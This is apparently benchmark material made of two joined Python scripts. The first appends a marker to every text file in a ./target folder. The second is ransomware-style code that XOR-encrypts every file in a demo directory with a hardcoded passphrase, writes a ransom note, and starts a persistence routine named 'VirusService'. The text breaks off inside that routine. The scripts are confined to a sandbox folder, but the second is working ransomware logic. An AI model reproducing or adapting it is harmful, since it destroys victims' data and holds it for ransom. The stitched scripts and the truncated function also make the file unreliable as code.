import os
import sys
import subprocess
from datetime import datetime
import time
import argparse

def is_text_file(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            f.read(1024)
        return True
    except (UnicodeDecodeError, IOError):
        return False

def append_marker_to_files(directory, marker, log_file):
    for root, _, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            timestamp = datetime.now().isoformat()
            if is_text_file(filepath):
                try:
                    with open(filepath, 'a', encoding='utf-8') as f:
                        f.write(marker)
                    log_file.write(f"{timestamp} - SUCCESS: Modified '{filepath}'\n")
                except IOError as e:
                    log_file.write(f"{timestamp} - SKIPPED: Could not modify '{filepath}' (IOError: {e})\n")
            else:
                log_file.write(f"{timestamp} - SKIPPED: '{filepath}' is not a text file\n")

def start_service(log_file):
    try:
        subprocess.check_call(["echo", "Service started"])
        log_file.write(f"{datetime.now().isoformat()} - INFO: Service started successfully\n")
    except subprocess.CalledProcessError as e:
        log_file.write(f"{datetime.now().isoformat()} - ERROR: Failed to start service (Error: {e})\n")

def monitor_directory(target_dir, marker, interval, iterations):
    log_file_path = 'modification_log.txt'

    with open(log_file_path, 'w', encoding='utf-8') as log_file:
        start_service(log_file)

        for _ in range(iterations):
            append_marker_to_files(target_dir, marker, log_file)
            time.sleep(interval)

def main():
    parser = argparse.ArgumentParser(description="Monitor and modify text files in the './target' directory.")
    parser.add_argument('--marker', type=str, default='--MODIFIED--', help="Marker string to append (default: '--MODIFIED--').")
    parser.add_argument('--interval', type=int, default=1, help="Interval in seconds between monitoring cycles (default: 1).")
    parser.add_argument('--iterations', type=int, default=1, help="Number of monitoring cycles (default: 1).")
    args = parser.parse_args()

    target_dir = './target'
    if not os.path.exists(target_dir):
        print(f"Directory '{target_dir}' does not exist.", file=sys.stderr)
        sys.exit(1)

    monitor_directory(target_dir, args.marker, args.interval, args.iterations)
    print(f"Monitoring complete. Log written to 'modification_log.txt'")

if __name__ == "__main__":
    main()

import argparse
import hashlib
import os
import platform
import subprocess
from pathlib import Path


PASSPHRASE = b"secure_passphrase"
DEMO_ROOT = Path("target")
DEFAULT_DIRECTORY = "target/demo_files"
DEFAULT_NOTE = (
    "The files in this directory have been encrypted.\n"
    "This is an authorized benchmark demonstration.\n"
)


def _safe_path(value: str, fallback: str) -> Path:
    path = Path(value)
    if path.is_absolute():
        return Path(fallback)
    return path


def _audit(message: str) -> None:
    try:
        DEMO_ROOT.mkdir(parents=True, exist_ok=True)
        with (DEMO_ROOT / "activity.log").open("a", encoding="utf-8") as handle:
            handle.write(message.rstrip() + "\n")
    except Exception:
        pass


def _stream_key(seed: bytes, length: int) -> bytes:
    output = bytearray()
    counter = 0
    while len(output) < length:
        output.extend(hashlib.sha256(seed + counter.to_bytes(8, "big")).digest())
        counter += 1
    return bytes(output[:length])


def _encrypt_file(path: Path, relative_name: str) -> bool:
    marker = b"DEMO-ENCRYPTED-V1\0"
    try:
        data = path.read_bytes()
        if data.startswith(marker):
            return False

        seed = PASSPHRASE + b"\0" + relative_name.encode("utf-8")
        key = _stream_key(seed, len(data))
        encrypted = bytes(value ^ key[index] for index, value in enumerate(data))
        path.write_bytes(marker + encrypted)
        _audit(f"Encrypted file: {path.as_posix()}")
        return True
    except Exception as exc:
        _audit(f"Failed to encrypt {path.as_posix()}: {exc}")
        return False


def _ensure_sample_data(directory: Path) -> None:
    try:
        directory.mkdir(parents=True, exist_ok=True)
        candidates = [
            item for item in directory.rglob("*")
            if item.is_file() and item.name not in {"README.txt", "activity.log"}
        ]
        if not candidates:
            (directory / "sample_document.txt").write_text(
                "Representative benchmark document.\n",
                encoding="utf-8",
            )
            (directory / "sample_data.bin").write_bytes(
                b"Representative benchmark data.\n"
            )
            _audit(f"Generated sample data in {directory.as_posix()}")
    except Exception as exc:
        _audit(f"Failed to generate sample data: {exc}")


def _encrypt_directory(directory: Path) -> int:
    count = 0
    try:
        files = sorted(
            (
                item for item in directory.rglob("*")
                if item.is_file()
                and not item.is_symlink()
                and item.name not in {"README.txt", "activity.log"}
            ),
            key=lambda item: item.as_posix(),
        )
        for path in files:
            relative_name = path.relative_to(directory).as_posix()
            if _encrypt_file(path, relative_name):
                count += 1
    except Exception as exc:
        _audit(f"Failed to process directory {directory.as_posix()}: {exc}")
    return count


def _write_ransom_note(directory: Path, content: str) -> None:
    try:
        note = directory / "README.txt"
        note.write_text(content, encoding="utf-8")
        _audit(f"Created ransom note: {note.as_posix()}")
    except Exception as exc:
        _audit(f"Failed to create ransom note: {exc}")


def _establish_persistence() -> None:
    system_name = platform.system().lower()

    if system_name == "windows":
        service_name = "VirusService"
        service_dir = DEMO_ROOT / "Windows" / "System32"
        service_file = service_dir / f"{service_name}.service"
        try:
            service_dir.mkdir(parents=True, exist_ok=True)
